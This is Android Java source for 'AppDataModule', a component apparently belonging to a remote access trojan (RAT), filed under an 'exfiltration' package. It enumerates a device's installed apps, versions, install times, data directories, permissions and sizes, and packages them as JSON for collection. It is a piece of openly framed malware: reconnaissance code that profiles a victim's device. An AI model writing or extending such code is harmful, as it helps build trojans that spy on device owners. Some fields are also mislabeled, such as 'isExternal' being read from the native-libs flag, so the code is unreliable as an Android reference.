package com.security.test.rat.modules.exfiltration;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * AppDataModule - Implements application data extraction
 * 
 * Features:
 * - Extract installed app list
 * - Get app information and metadata
 * - Extract app data directories
 * - Get app permissions
 * - Export app statistics
 */
public class AppDataModule extends RATModule {
    
    private static final String TAG = "AppDataModule";
    
    private Context context;
    private PackageManager packageManager;
    private boolean isInitialized = false;
    
    public AppDataModule(Context context) {
        super("AppDataModule", "Application data extraction and analysis");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing AppDataModule");
            
            // Initialize package manager
            packageManager = context.getPackageManager();
            if (packageManager == null) {
                Log.e(TAG, "Package manager not available");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "AppDataModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize AppDataModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "AppDataModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during AppDataModule cleanup", e);
        }
    }
    
    /**
     * Extract all installed applications
     */
    public String extractAllApplications() throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting all installed applications");
            
            List<AppInfo> applications = getAllApplications();
            JSONArray appsArray = new JSONArray();
            
            for (AppInfo app : applications) {
                appsArray.put(app.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_apps", applications.size());
            result.put("applications", appsArray);
            
            Log.i(TAG, "Extracted " + applications.size() + " applications");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract applications", e);
            throw e;
        }
    }
    
    /**
     * Extract application by package name
     */
    public String extractApplicationByPackage(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting application: " + packageName);
            
            AppInfo appInfo = getApplicationInfo(packageName);
            if (appInfo == null) {
                throw new Exception("Application not found: " + packageName);
            }
            
            JSONObject result = new JSONObject();
            result.put("application", appInfo.toJSON());
            
            Log.i(TAG, "Extracted application: " + packageName);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract application: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Extract system applications only
     */
    public String extractSystemApplications() throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting system applications");
            
            List<AppInfo> systemApps = getSystemApplications();
            JSONArray appsArray = new JSONArray();
            
            for (AppInfo app : systemApps) {
                appsArray.put(app.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_system_apps", systemApps.size());
            result.put("system_applications", appsArray);
            
            Log.i(TAG, "Extracted " + systemApps.size() + " system applications");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract system applications", e);
            throw e;
        }
    }
    
    /**
     * Extract user applications only
     */
    public String extractUserApplications() throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting user applications");
            
            List<AppInfo> userApps = getUserApplications();
            JSONArray appsArray = new JSONArray();
            
            for (AppInfo app : userApps) {
                appsArray.put(app.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_user_apps", userApps.size());
            result.put("user_applications", appsArray);
            
            Log.i(TAG, "Extracted " + userApps.size() + " user applications");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract user applications", e);
            throw e;
        }
    }
    
    /**
     * Search applications by criteria
     */
    public String searchApplications(String searchTerm, String category) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            Log.i(TAG, "Searching applications for: " + searchTerm + " (category: " + category + ")");
            
            List<AppInfo> matchingApps = searchApplicationsByCriteria(searchTerm, category);
            JSONArray appsArray = new JSONArray();
            
            for (AppInfo app : matchingApps) {
                appsArray.put(app.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("search_term", searchTerm);
            result.put("category", category);
            result.put("total_results", matchingApps.size());
            result.put("applications", appsArray);
            
            Log.i(TAG, "Found " + matchingApps.size() + " matching applications");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to search applications", e);
            throw e;
        }
    }
    
    /**
     * Get all applications
     */
    private List<AppInfo> getAllApplications() {
        List<AppInfo> applications = new ArrayList<>();
        
        try {
            List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.GET_PERMISSIONS);
            
            for (PackageInfo packageInfo : packages) {
                try {
                    AppInfo appInfo = createAppInfo(packageInfo);
                    applications.add(appInfo);
                } catch (Exception e) {
                    Log.w(TAG, "Error processing package: " + packageInfo.packageName, e);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting all applications", e);
        }
        
        return applications;
    }
    
    /**
     * Get application info by package name
     */
    private AppInfo getApplicationInfo(String packageName) {
        try {
            PackageInfo packageInfo = packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS);
            return createAppInfo(packageInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error getting application info: " + packageName, e);
            return null;
        }
    }
    
    /**
     * Get system applications
     */
    private List<AppInfo> getSystemApplications() {
        List<AppInfo> systemApps = new ArrayList<>();
        
        try {
            List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.GET_PERMISSIONS);
            
            for (PackageInfo packageInfo : packages) {
                try {
                    if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                        AppInfo appInfo = createAppInfo(packageInfo);
                        systemApps.add(appInfo);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Error processing system package: " + packageInfo.packageName, e);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting system applications", e);
        }
        
        return systemApps;
    }
    
    /**
     * Get user applications
     */
    private List<AppInfo> getUserApplications() {
        List<AppInfo> userApps = new ArrayList<>();
        
        try {
            List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.GET_PERMISSIONS);
            
            for (PackageInfo packageInfo : packages) {
                try {
                    if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        AppInfo appInfo = createAppInfo(packageInfo);
                        userApps.add(appInfo);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Error processing user package: " + packageInfo.packageName, e);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting user applications", e);
        }
        
        return userApps;
    }
    
    /**
     * Search applications by criteria
     */
    private List<AppInfo> searchApplicationsByCriteria(String searchTerm, String category) {
        List<AppInfo> matchingApps = new ArrayList<>();
        
        try {
            List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.GET_PERMISSIONS);
            
            for (PackageInfo packageInfo : packages) {
                try {
                    boolean matches = true;
                    
                    // Check search term
                    if (searchTerm != null && !searchTerm.isEmpty()) {
                        String appName = packageInfo.applicationInfo.loadLabel(packageManager).toString().toLowerCase();
                        String packageName = packageInfo.packageName.toLowerCase();
                        
                        if (!appName.contains(searchTerm.toLowerCase()) && !packageName.contains(searchTerm.toLowerCase())) {
                            matches = false;
                        }
                    }
                    
                    // Check category
                    if (category != null && !category.isEmpty()) {
                        if (category.equals("system")) {
                            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                                matches = false;
                            }
                        } else if (category.equals("user")) {
                            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                                matches = false;
                            }
                        }
                    }
                    
                    if (matches) {
                        AppInfo appInfo = createAppInfo(packageInfo);
                        matchingApps.add(appInfo);
                    }
                    
                } catch (Exception e) {
                    Log.w(TAG, "Error processing package during search: " + packageInfo.packageName, e);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching applications", e);
        }
        
        return matchingApps;
    }
    
    /**
     * Create application info object
     */
    private AppInfo createAppInfo(PackageInfo packageInfo) {
        AppInfo appInfo = new AppInfo();
        
        try {
            appInfo.setPackageName(packageInfo.packageName);
            appInfo.setVersionName(packageInfo.versionName);
            appInfo.setVersionCode(packageInfo.versionCode);
            appInfo.setFirstInstallTime(packageInfo.firstInstallTime);
            appInfo.setLastUpdateTime(packageInfo.lastUpdateTime);
            
            // Application info
            ApplicationInfo appInfoData = packageInfo.applicationInfo;
            appInfo.setAppName(appInfoData.loadLabel(packageManager).toString());
            appInfo.setSourceDir(appInfoData.sourceDir);
            appInfo.setDataDir(appInfoData.dataDir);
            appInfo.setIsSystemApp((appInfoData.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            appInfo.setIsUpdatedSystemApp((appInfoData.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
            appInfo.setIsExternal((appInfoData.flags & ApplicationInfo.FLAG_EXTRACT_NATIVE_LIBS) != 0);
            
            // Permissions
            if (packageInfo.permissions != null) {
                List<String> permissions = new ArrayList<>();
                for (android.content.pm.PermissionInfo permission : packageInfo.permissions) {
                    permissions.add(permission.name);
                }
                appInfo.setPermissions(permissions);
            }
            
            // Get app size
            try {
                File sourceFile = new File(appInfoData.sourceDir);
                if (sourceFile.exists()) {
                    appInfo.setAppSize(sourceFile.length());
                }
            } catch (Exception e) {
                Log.w(TAG, "Error getting app size for: " + packageInfo.packageName, e);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating app info for: " + packageInfo.packageName, e);
        }
        
        return appInfo;
    }
    
    /**
     * Get application statistics
     */
    public String getApplicationStatistics() throws Exception {
        if (!isInitialized) {
            throw new Exception("AppDataModule not initialized");
        }
        
        try {
            List<AppInfo> allApps = getAllApplications();
            List<AppInfo> systemApps = getSystemApplications();
            List<AppInfo> userApps = getUserApplications();
            
            long totalAppSize = 0;
            for (AppInfo app : allApps) {
                totalAppSize += app.getAppSize();
            }
            
            JSONObject stats = new JSONObject();
            stats.put("total_applications", allApps.size());
            stats.put("system_applications", systemApps.size());
            stats.put("user_applications", userApps.size());
            stats.put("total_app_size_bytes", totalAppSize);
            stats.put("average_app_size_bytes", allApps.size() > 0 ? totalAppSize / allApps.size() : 0);
            
            return stats.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get application statistics", e);
            throw e;
        }
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        try {
            int totalApps = getAllApplications().size();
            return "Ready - " + totalApps + " applications available";
            
        } catch (Exception e) {
            return "Error getting application count";
        }
    }
    
    /**
     * Application Information data class
     */
    private static class AppInfo {
        private String packageName;
        private String appName;
        private String versionName;
        private int versionCode;
        private long firstInstallTime;
        private long lastUpdateTime;
        private String sourceDir;
        private String dataDir;
        private boolean isSystemApp;
        private boolean isUpdatedSystemApp;
        private boolean isExternal;
        private long appSize;
        private List<String> permissions;
        
        public AppInfo() {
            this.permissions = new ArrayList<>();
        }
        
        // Getters and setters
        public String getPackageName() { return packageName; }
        public void setPackageName(String packageName) { this.packageName = packageName; }
        public String getAppName() { return appName; }
        public void setAppName(String appName) { this.appName = appName; }
        public String getVersionName() { return versionName; }
        public void setVersionName(String versionName) { this.versionName = versionName; }
        public int getVersionCode() { return versionCode; }
        public void setVersionCode(int versionCode) { this.versionCode = versionCode; }
        public long getFirstInstallTime() { return firstInstallTime; }
        public void setFirstInstallTime(long firstInstallTime) { this.firstInstallTime = firstInstallTime; }
        public long getLastUpdateTime() { return lastUpdateTime; }
        public void setLastUpdateTime(long lastUpdateTime) { this.lastUpdateTime = lastUpdateTime; }
        public String getSourceDir() { return sourceDir; }
        public void setSourceDir(String sourceDir) { this.sourceDir = sourceDir; }
        public String getDataDir() { return dataDir; }
        public void setDataDir(String dataDir) { this.dataDir = dataDir; }
        public boolean isSystemApp() { return isSystemApp; }
        public void setIsSystemApp(boolean isSystemApp) { this.isSystemApp = isSystemApp; }
        public boolean isUpdatedSystemApp() { return isUpdatedSystemApp; }
        public void setIsUpdatedSystemApp(boolean isUpdatedSystemApp) { this.isUpdatedSystemApp = isUpdatedSystemApp; }
        public boolean isExternal() { return isExternal; }
        public void setIsExternal(boolean isExternal) { this.isExternal = isExternal; }
        public long getAppSize() { return appSize; }
        public void setAppSize(long appSize) { this.appSize = appSize; }
        public List<String> getPermissions() { return permissions; }
        public void setPermissions(List<String> permissions) { this.permissions = permissions; }
        
        /**
         * Convert app info to JSON
         */
        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("package_name", packageName);
            json.put("app_name", appName);
            json.put("version_name", versionName);
            json.put("version_code", versionCode);
            json.put("first_install_time", firstInstallTime);
            json.put("last_update_time", lastUpdateTime);
            json.put("source_dir", sourceDir);
            json.put("data_dir", dataDir);
            json.put("is_system_app", isSystemApp);
            json.put("is_updated_system_app", isUpdatedSystemApp);
            json.put("is_external", isExternal);
            json.put("app_size_bytes", appSize);
            json.put("permissions", new JSONArray(permissions));
            return json;
        }
    }
}
